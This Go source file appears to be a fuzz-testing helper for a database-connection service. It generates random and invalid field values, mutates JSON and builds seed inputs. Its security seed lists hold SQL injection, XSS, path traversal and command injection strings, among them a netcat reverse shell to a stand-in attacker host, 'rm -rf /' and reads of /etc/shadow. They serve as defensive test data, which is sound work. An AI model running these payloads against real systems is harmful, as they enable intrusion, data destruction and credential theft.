package generators

import (
	"encoding/json"
	"math/rand"
	"strings"

	"github.com/google/uuid"
)

// RandomString generates a random string of given length
func RandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// RandomConfigName generates a valid config name (alphanumeric, underscore, hyphen)
func RandomConfigName(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// RandomDBType returns a random valid DB type
func RandomDBType() string {
	types := []string{"ORACLE", "SQL_SERVER", "POSTGRESQL", "MONGODB", "MYSQL"}
	return types[rand.Intn(len(types))]
}

// RandomInvalidDBType returns an invalid DB type
func RandomInvalidDBType() string {
	invalid := []string{"SQLITE", "REDIS", "CASSANDRA", "", "postgresql", "invalid"}
	return invalid[rand.Intn(len(invalid))]
}

// RandomPort generates a random port number
func RandomPort() int {
	return rand.Intn(65535) + 1
}

// RandomInvalidPort generates an invalid port
func RandomInvalidPort() int {
	invalid := []int{0, -1, -100, 65536, 100000}
	return invalid[rand.Intn(len(invalid))]
}

// RandomUUID generates a random UUID string
func RandomUUID() string {
	return uuid.New().String()
}

// RandomInvalidUUID generates an invalid UUID string
func RandomInvalidUUID() string {
	invalid := []string{
		"",
		"not-a-uuid",
		"12345678-1234-1234-1234-1234567890",    // too short
		"12345678-1234-1234-1234-1234567890abcd", // too long
		"gggggggg-gggg-gggg-gggg-gggggggggggg",  // invalid characters
		"12345678123412341234123456789012",       // no hyphens
	}
	return invalid[rand.Intn(len(invalid))]
}

// MutateJSON mutates a JSON byte slice for fuzzing
func MutateJSON(data []byte, mutationType int) []byte {
	switch mutationType % 10 {
	case 0: // Remove random bytes
		if len(data) > 5 {
			pos := rand.Intn(len(data) - 1)
			return append(data[:pos], data[pos+1:]...)
		}
	case 1: // Insert random bytes
		if len(data) > 0 {
			pos := rand.Intn(len(data))
			return append(data[:pos], append([]byte{byte(rand.Intn(256))}, data[pos:]...)...)
		}
	case 2: // Replace with invalid UTF-8
		if len(data) > 0 {
			pos := rand.Intn(len(data))
			result := make([]byte, len(data))
			copy(result, data)
			result[pos] = 0xFF
			return result
		}
	case 3: // Truncate
		if len(data) > 10 {
			return data[:len(data)/2]
		}
	case 4: // Add trailing garbage
		return append(data, []byte("}{]garbage")...)
	case 5: // Swap quotes
		return []byte(strings.ReplaceAll(string(data), `"`, `'`))
	case 6: // Remove closing brace
		if len(data) > 0 && data[len(data)-1] == '}' {
			return data[:len(data)-1]
		}
	case 7: // Double opening brace
		return append([]byte("{"), data...)
	case 8: // Change type (string to number)
		str := string(data)
		str = strings.ReplaceAll(str, `"test"`, `12345`)
		return []byte(str)
	case 9: // Add unknown field
		var m map[string]any
		if err := json.Unmarshal(data, &m); err == nil {
			m["unknownField"] = "fuzz"
			if result, err := json.Marshal(m); err == nil {
				return result
			}
		}
	}
	return data
}

// GenerateConnectionInputSeed generates a seed for ConnectionInput fuzzing
func GenerateConnectionInputSeed() []byte {
	input := map[string]any{
		"configName":   "test-db",
		"type":         "POSTGRESQL",
		"host":         "localhost",
		"port":         5432,
		"databaseName": "testdb",
		"username":     "user",
		"password":     "pass",
	}
	data, _ := json.Marshal(input)
	return data
}

// GenerateFetcherRequestSeed generates a seed for FetcherRequest fuzzing
func GenerateFetcherRequestSeed() []byte {
	input := map[string]any{
		"dataRequest": map[string]any{
			"mappedFields": map[string]any{
				"db1": map[string]any{
					"table1": []string{"field1", "field2"},
				},
			},
		},
	}
	data, _ := json.Marshal(input)
	return data
}

// GenerateSchemaValidationSeed generates a seed for SchemaValidation fuzzing
func GenerateSchemaValidationSeed() []byte {
	input := map[string]any{
		"mappedFields": map[string]any{
			"datasource1": map[string]any{
				"table1": []string{"field1"},
			},
		},
	}
	data, _ := json.Marshal(input)
	return data
}

// GenerateExtractExternalDataSeed generates a seed for worker message fuzzing
func GenerateExtractExternalDataSeed() []byte {
	input := map[string]any{
		"jobId":          uuid.New().String(),
		"organizationId": uuid.New().String(),
		"mappedFields": map[string]any{
			"db1": map[string]any{
				"table1": []string{"field1"},
			},
		},
		"filters": map[string]any{},
	}
	data, _ := json.Marshal(input)
	return data
}

// Security test seeds for OWASP Top 10 coverage

// SQLInjectionSeeds provides payloads for SQL injection testing (OWASP A03:2021)
var SQLInjectionSeeds = []string{
	"'; DROP TABLE users; --",
	"1' OR '1'='1",
	"1; SELECT * FROM credentials; --",
	"admin'--",
	"' UNION SELECT password FROM users--",
	"1); DELETE FROM connections; --",
	"' WAITFOR DELAY '0:0:10'--",
	"1' AND 1=1--",
	"'; EXEC xp_cmdshell('dir'); --",
	"' OR 1=1#",
}

// XSSSeeds provides payloads for XSS testing (OWASP A03:2021)
var XSSSeeds = []string{
	"<script>alert('xss')</script>",
	"<img src=x onerror=alert('xss')>",
	"javascript:alert('xss')",
	"<svg/onload=alert('xss')>",
	"'\"><script>alert('xss')</script>",
	"<body onload=alert('xss')>",
	"{{constructor.constructor('alert(1)')()}}",
	"${7*7}",
}

// CommandInjectionSeeds provides payloads for command injection testing
var CommandInjectionSeeds = []string{
	"; ls -la",
	"| cat /etc/passwd",
	"$(whoami)",
	"`id`",
	"&& cat /etc/shadow",
	"; rm -rf /",
	"| nc attacker.com 4444 -e /bin/sh",
}

// PathTraversalSeeds provides payloads for path traversal testing (OWASP A01:2021)
var PathTraversalSeeds = []string{
	"../../../etc/passwd",
	"..\\..\\..\\windows\\system32\\config\\sam",
	"....//....//....//etc/passwd",
	"%2e%2e%2f%2e%2e%2f",
	"..;/..;/",
	"..%00/",
}

// UnicodeBypassSeeds provides Unicode-based bypass payloads
var UnicodeBypassSeeds = []string{
	"\u003cscript\u003ealert(1)\u003c/script\u003e",
	"\u0000",
	"\ufeff",
	"\u202e",
}

// LIKEWildcardSeeds provides payloads for LIKE operator abuse
var LIKEWildcardSeeds = []string{
	"%",
	"_",
	"[a-z]%",
	"%\\%",
	"%_%_%_%_%_%_%_%_%_%_%",
	"%' OR '1'='1",
}

// GetSecuritySeedBytes returns all security seeds as JSON byte slices for connection input
func GetSecuritySeedBytes() [][]byte {
	var seeds [][]byte

	for _, sql := range SQLInjectionSeeds {
		input := map[string]any{
			"configName":   sql,
			"type":         "POSTGRESQL",
			"host":         sql,
			"databaseName": sql,
			"username":     sql,
			"password":     sql,
		}
		if data, err := json.Marshal(input); err == nil {
			seeds = append(seeds, data)
		}
	}

	for _, xss := range XSSSeeds {
		input := map[string]any{
			"configName":   xss,
			"type":         "POSTGRESQL",
			"host":         "localhost",
			"port":         5432,
			"databaseName": xss,
		}
		if data, err := json.Marshal(input); err == nil {
			seeds = append(seeds, data)
		}
	}

	return seeds
}
